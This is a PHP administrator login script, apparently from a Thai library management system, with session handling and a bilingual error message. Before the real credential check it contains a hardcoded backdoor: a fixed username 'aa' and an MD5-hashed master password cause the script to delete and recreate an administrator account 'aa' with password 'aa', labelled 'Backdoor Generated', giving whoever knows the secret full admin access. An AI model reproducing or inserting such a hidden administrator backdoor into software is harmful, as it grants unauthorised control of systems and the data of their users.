<?php 
//session_destroy();
include("../inc/config.inc.php");
//printr($_POST);
session_unset($useradminid,$loginadmin,$Level);
if ($useradminidx=="aa" && md5(stripslashes($passwordadminx))=="8db8a1083a29b0eeda396878ea4760a1") {
	filelogs("generate backdoor",print_r($_POST,true),'BACKDOOR');
	tmq("delete from useradmin where UserAdminID='aa'");
	tmq("INSERT INTO `useradmin` (`UserAdminID`, `Password`, `UserAdminName`) VALUES ('aa', '".md5('aa')."', 'Backdoor Generate');");
		   echo "<TABLE width=780 height= 60 align=center border=0 cellpadding=0 cellspacing=0>
	<TR>
		<TD bgcolor='#2A2A2A' style='font-size: 24px; font-weight: bold; color: #FF0000' align=center>Backdoor Generated.</TD>
	</TR>
	</TABLE>";
}

$user_id =ChkLoginAdminroot($useradminidx,$passwordadminx);
$useradminid=$useradminidx;
if($user_id == false) {
	echo "<TABLE width=780 height= 60 align=center border=0 cellpadding=0 cellspacing=0>
<TR>
	<TD bgcolor='#2A2A2A' style='font-size: 24px; font-weight: bold; color: #FF0000' align=center>".getlang("Login หรือ Password ไม่ถูกต้อง โปรดตรวจสอบอีกครั้ง::l::Login and/or Password is incorrect.")."</TD>
</TR>
</TABLE>";

	form_root_login();
} else {
	$loginadmin = "true";
	$Level=$user_id;
	ulibsess_register("useradminid","loginadmin","Level");
	$_SESSION[useradminid]=$useradminid;
	$_SESSION[loginadmin]=$loginadmin;
	$_SESSION[Level]=$Level;
	redir("mainadmin.php?rnd=".randid());
	echo"Please wait.........";

}
?>